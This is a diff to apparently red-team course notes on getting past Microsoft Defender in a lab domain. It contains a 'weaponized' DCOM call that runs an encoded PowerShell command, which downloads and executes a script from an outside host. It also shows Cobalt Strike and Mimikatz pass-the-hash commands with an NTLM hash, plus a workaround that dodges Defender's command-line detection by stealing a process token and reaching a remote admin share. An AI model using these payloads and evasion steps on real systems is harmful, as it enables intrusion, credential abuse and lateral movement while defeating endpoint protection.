@@ -69,3 +69,25 @@ A weaponized example:
     Set obj = shellWindows.Item()
     obj.Document.Application.ShellExecute "powershell.exe", "-nop -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AbgBpAGMAawBlAGwAdgBpAHAAZQByAC4AYwBvAG0ALwBhACIAKQA=", Null, Null, 0
 
+## Command Line Detections
+
+Defender can also inspect the command line arguments of a process and prevent it from starting if it has malicious content, e.g. the built-in pth command:
+
+    beacon> getuid
+    [*] You are DEV\bfarmer (admin)
+    beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c
+
+The console log shows that this expands to:
+
+    sekurlsa::pth /user:"jking" /domain:"DEV" /ntlm:59fc0f884922b4ce376051134c71e22c /run:"%COMSPEC% /c echo 9c91bb58485 > \\.\pipe\34a65a"
+
+This gets an access denied error when Mimikatz tries to call CreateProcessWithLogonW. The "CmdLine" prefix gives away the origin of the detection. In this case, it's the ```echo x > \\.\pipe\``` pattern, which is synonymous with named pipe impersonation. Enforcement is by the Windows Defender driver in the kernel. This driver gets notified when new processes which contain a PS_CREATE_NOTIFY_INFO structure are created. 
+
+Bypassing or disabling kernel-level callbacks is out of scope for RTO. A workaround is not use the same command line arguments. For pass-the-hash, start an arbitrary process and steal its token manually:
+
+    beacon> mimikatz sekurlsa::pth /user:"jking" /domain:"DEV" /ntlm:59fc0f884922b4ce376051134c71e22c /run:notepad.exe
+    beacon> steal_token 17896    //PID
+    [+] Impersonated DEV\bfarmer
+    beacon> ls \\web.dev.cyberbotic.io\c$
+
+
